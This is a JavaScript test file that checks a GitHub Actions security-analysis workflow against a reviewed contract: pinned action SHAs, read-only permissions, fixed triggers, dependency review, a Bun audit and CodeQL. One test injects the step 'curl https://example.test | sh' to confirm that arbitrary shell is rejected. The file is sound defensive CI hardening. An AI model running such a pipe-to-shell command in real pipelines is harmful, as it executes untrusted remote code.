import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import test from 'node:test';
import { parse as parseYaml, stringify as stringifyYaml } from 'yaml';

const root = resolve(import.meta.dirname, '../..');
const workflowPath = resolve(root, '.github/workflows/security-analysis.yml');
const workflowText = readFileSync(workflowPath, 'utf8');

const ACTION_PINS = new Map([
  ['actions/checkout', '9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0'], // v7
  ['actions/setup-node', '249970729cb0ef3589644e2896645e5dc5ba9c38'], // v6
  ['actions/dependency-review-action', '3c4e3dcb1aa7874d2c16be7d79418e9b7efd6261'], // v4.8.2
  ['github/codeql-action/init', '0d579ffd059c29b07949a3cce3983f0780820c98'], // v4.32.6^{}
  ['github/codeql-action/analyze', '0d579ffd059c29b07949a3cce3983f0780820c98'], // v4.32.6^{}
]);

const EXPECTED_JOBS = {
  'dependency-review': 'Dependency Review',
  'bun-dependency-audit': 'Bun Dependency Audit',
  codeql: 'Static Security Analysis (javascript-typescript)',
};

const EXPECTED_JOB_CONTRACTS = {
  'dependency-review': {
    name: 'Dependency Review',
    if: "github.event_name == 'pull_request'",
    'runs-on': 'ubuntu-latest',
    permissions: { contents: 'read' },
    steps: [
      { uses: 'actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0' },
      {
        uses: 'actions/dependency-review-action@3c4e3dcb1aa7874d2c16be7d79418e9b7efd6261',
        with: {
          'fail-on-severity': 'high',
          'license-check': false,
          'vulnerability-check': true,
          'warn-only': false,
          'comment-summary-in-pr': 'never',
        },
      },
    ],
  },
  'bun-dependency-audit': {
    name: 'Bun Dependency Audit',
    'runs-on': 'ubuntu-latest',
    permissions: { contents: 'read' },
    steps: [
      { uses: 'actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0' },
      {
        uses: 'actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38',
        with: { 'node-version': 24 },
      },
      { name: 'Install pinned Bun runtime', run: 'npm install --global bun@1.3.14' },
      { name: 'Install immutable dependencies', run: 'bun install --frozen-lockfile' },
      {
        name: 'Audit high-or-higher dependency vulnerabilities',
        run: 'bun audit --audit-level=high',
      },
    ],
  },
  codeql: {
    name: 'Static Security Analysis (javascript-typescript)',
    'runs-on': 'ubuntu-latest',
    permissions: {
      actions: 'read',
      contents: 'read',
      packages: 'read',
      'security-events': 'write',
    },
    steps: [
      { uses: 'actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0' },
      {
        name: 'Initialize CodeQL',
        uses: 'github/codeql-action/init@0d579ffd059c29b07949a3cce3983f0780820c98',
        with: { languages: 'javascript-typescript' },
      },
      {
        name: 'Analyze JavaScript and TypeScript',
        uses: 'github/codeql-action/analyze@0d579ffd059c29b07949a3cce3983f0780820c98',
      },
    ],
  },
};

function permissionsEqual(actual, expected) {
  return JSON.stringify(actual) === JSON.stringify(expected);
}

function validateSecurityAnalysisWorkflow(text) {
  const document = parseYaml(text);
  const errors = [];
  const triggers = document?.on;
  const expectedTriggers = ['pull_request', 'push', 'schedule', 'workflow_dispatch'];

  if (
    JSON.stringify(Object.keys(document ?? {}).sort()) !==
    JSON.stringify(['jobs', 'name', 'on', 'permissions'])
  ) {
    errors.push('workflow top-level keys must exactly match the reviewed contract');
  }
  if (document?.name !== 'Security Analysis') {
    errors.push('workflow name must be Security Analysis');
  }

  if (!triggers || typeof triggers !== 'object') {
    errors.push('workflow triggers must be an object');
  } else {
    if (JSON.stringify(Object.keys(triggers).sort()) !== JSON.stringify(expectedTriggers.sort())) {
      errors.push('workflow triggers must exactly cover PR, push, schedule, and dispatch');
    }
    for (const [name, trigger] of Object.entries(triggers)) {
      if (
        trigger &&
        typeof trigger === 'object' &&
        !Array.isArray(trigger) &&
        (Object.hasOwn(trigger, 'paths') || Object.hasOwn(trigger, 'paths-ignore'))
      ) {
        errors.push(`${name} must not use path filters`);
      }
    }
    for (const name of ['pull_request', 'push']) {
      const trigger = triggers[name];
      if (JSON.stringify(trigger?.branches) !== JSON.stringify(['main'])) {
        errors.push(`${name} must target main`);
      }
      if (trigger && typeof trigger === 'object' && Object.hasOwn(trigger, 'branches-ignore')) {
        errors.push(`${name} must not use branch exclusions`);
      }
    }
    if (
      !Array.isArray(triggers.schedule) ||
      triggers.schedule.length !== 1 ||
      typeof triggers.schedule[0]?.cron !== 'string' ||
      !/^\d{1,2} \d{1,2} \* \* [0-6]$/u.test(triggers.schedule[0].cron.trim())
    ) {
      errors.push('workflow must have one valid weekly cron schedule');
    }
    if (
      JSON.stringify(triggers) !==
      JSON.stringify({
        pull_request: { branches: ['main'] },
        push: { branches: ['main'] },
        schedule: [{ cron: '23 4 * * 2' }],
        workflow_dispatch: null,
      })
    ) {
      errors.push('workflow triggers must exactly match the reviewed event contract');
    }
  }

  if (!permissionsEqual(document?.permissions, { contents: 'read' })) {
    errors.push('workflow permissions must default to contents: read');
  }

  const jobs = document?.jobs ?? {};
  if (
    JSON.stringify(Object.keys(jobs).sort()) !== JSON.stringify(Object.keys(EXPECTED_JOBS).sort())
  ) {
    errors.push('workflow jobs must exactly match the reviewed security analysis contract');
  }
  for (const [jobId, expectedName] of Object.entries(EXPECTED_JOBS)) {
    if (jobs[jobId]?.name !== expectedName) errors.push(`${jobId} check name drifted`);
    if (jobs[jobId]?.['runs-on'] !== 'ubuntu-latest')
      errors.push(`${jobId} must use ubuntu-latest`);
    if (JSON.stringify(jobs[jobId]) !== JSON.stringify(EXPECTED_JOB_CONTRACTS[jobId])) {
      errors.push(`${jobId} must exactly match the reviewed step and job contract`);
    }
  }

  if (jobs['dependency-review']?.if !== "github.event_name == 'pull_request'") {
    errors.push('dependency review must run only for pull requests');
  }
  if (!permissionsEqual(jobs['dependency-review']?.permissions, { contents: 'read' })) {
    errors.push('dependency review permissions must be contents: read');
  }
  if (!permissionsEqual(jobs['bun-dependency-audit']?.permissions, { contents: 'read' })) {
    errors.push('Bun audit permissions must be contents: read');
  }
  if (
    !permissionsEqual(jobs.codeql?.permissions, {
      actions: 'read',
      contents: 'read',
      packages: 'read',
      'security-events': 'write',
    })
  ) {
    errors.push(
      'CodeQL permissions must be actions/contents/packages read and security-events write',
    );
  }

  const steps = Object.values(jobs).flatMap((job) => job?.steps ?? []);
  for (const step of steps) {
    if (!step.uses) continue;
    const match = /^([^@]+)@([0-9a-f]{40})$/u.exec(step.uses);
    if (!match) {
      errors.push(`action ref must use an immutable SHA: ${step.uses}`);
      continue;
    }
    const expectedSha = ACTION_PINS.get(match[1]);
    if (!expectedSha) {
      errors.push(`action is not in the reviewed official GitHub allowlist: ${match[1]}`);
    } else if (match[2] !== expectedSha) {
      errors.push(`action SHA does not match the reviewed upstream ref: ${match[1]}`);
    }
  }

  const dependencyStep = jobs['dependency-review']?.steps?.find((step) =>
    String(step.uses ?? '').startsWith('actions/dependency-review-action@'),
  );
  const expectedDependencyInputs = EXPECTED_JOB_CONTRACTS['dependency-review'].steps[1].with;
  if (JSON.stringify(dependencyStep?.with) !== JSON.stringify(expectedDependencyInputs)) {
    errors.push('dependency review inputs must exactly match the reviewed vulnerability policy');
  }

  const bunRuns = new Set(
    (jobs['bun-dependency-audit']?.steps ?? []).map((step) => step.run).filter(Boolean),
  );
  if (!bunRuns.has('bun install --frozen-lockfile')) {
    errors.push('Bun audit must use a frozen dependency install');
  }
  if (!bunRuns.has('bun audit --audit-level=high')) {
    errors.push('Bun audit must fail on high-or-higher severity');
  }

  const codeqlInit = jobs.codeql?.steps?.find((step) =>
    String(step.uses ?? '').startsWith('github/codeql-action/init@'),
  );
  const codeqlAnalyze = jobs.codeql?.steps?.find((step) =>
    String(step.uses ?? '').startsWith('github/codeql-action/analyze@'),
  );
  if (codeqlInit?.with?.languages !== 'javascript-typescript') {
    errors.push('CodeQL must analyze javascript-typescript');
  }
  if (!codeqlAnalyze) errors.push('CodeQL analyze step is required');

  return errors;
}

function mutate(mutator) {
  const document = parseYaml(workflowText);
  mutator(document);
  return stringifyYaml(document);
}

test('security analysis workflow is pinned and matches the reviewed trigger and permission contract', () => {
  assert.deepEqual(validateSecurityAnalysisWorkflow(workflowText), []);
});

test('security analysis workflow rejects trigger, filter, and permission drift', () => {
  const errors = validateSecurityAnalysisWorkflow(
    mutate((workflow) => {
      delete workflow.on.schedule;
      workflow.on.pull_request.paths = ['packages/**'];
      workflow.jobs.codeql.permissions.contents = 'write';
    }),
  );
  assert.ok(errors.some((error) => error.includes('schedule')));
  assert.ok(errors.some((error) => error.includes('path filters')));
  assert.ok(errors.some((error) => error.includes('CodeQL permissions')));
});

test('security analysis workflow rejects mutable, unofficial, and mismatched action refs', () => {
  for (const action of [
    'github/codeql-action/init@v4',
    `vendor/example@${'a'.repeat(40)}`,
    `github/codeql-action/init@${'a'.repeat(40)}`,
  ]) {
    const errors = validateSecurityAnalysisWorkflow(
      mutate((workflow) => {
        workflow.jobs.codeql.steps[1].uses = action;
      }),
    );
    assert.ok(
      errors.some((error) => /immutable|allowlist|upstream ref/u.test(error)),
      action,
    );
  }
});

test('security analysis workflow rejects weakened severity, language, install, and check names', () => {
  const errors = validateSecurityAnalysisWorkflow(
    mutate((workflow) => {
      workflow.jobs['dependency-review'].name = 'Dependencies';
      workflow.jobs['dependency-review'].steps[1].with['fail-on-severity'] = 'critical';
      workflow.jobs['bun-dependency-audit'].steps[3].run = 'bun install';
      workflow.jobs.codeql.steps[1].with.languages = 'python';
    }),
  );
  assert.ok(errors.some((error) => error.includes('check name drifted')));
  assert.ok(errors.some((error) => error.includes('reviewed vulnerability policy')));
  assert.ok(errors.some((error) => error.includes('frozen dependency install')));
  assert.ok(errors.some((error) => error.includes('javascript-typescript')));
});

test('security analysis workflow rejects job conditions, installer drift, and arbitrary shell', () => {
  for (const mutation of [
    (workflow) => {
      workflow.jobs['bun-dependency-audit'].if = 'always()';
    },
    (workflow) => {
      workflow.jobs.codeql.if = "github.event_name == 'push'";
    },
    (workflow) => {
      workflow.jobs['bun-dependency-audit'].steps[2].run = 'npm install --global bun@latest';
    },
    (workflow) => {
      workflow.jobs['bun-dependency-audit'].steps.splice(2, 1);
    },
    (workflow) => {
      workflow.jobs['bun-dependency-audit'].steps.push({ run: 'curl https://example.test | sh' });
    },
  ]) {
    assert.ok(
      validateSecurityAnalysisWorkflow(mutate(mutation)).some((error) =>
        error.includes('exactly match the reviewed step and job contract'),
      ),
    );
  }
});

test('security analysis workflow rejects dependency overrides and disabled CodeQL upload', () => {
  for (const mutation of [
    (workflow) => {
      workflow.jobs['dependency-review'].steps[1].with['warn-only'] = true;
    },
    (workflow) => {
      workflow.jobs['dependency-review'].steps[1].with.config = '.github/dependency-review.yml';
    },
    (workflow) => {
      workflow.jobs['dependency-review'].steps[1].with['allow-ghsas'] = 'GHSA-test';
    },
    (workflow) => {
      workflow.jobs.codeql.steps[2].with = { 'upload-database': 'never' };
    },
  ]) {
    assert.ok(validateSecurityAnalysisWorkflow(mutate(mutation)).length > 0);
  }
});
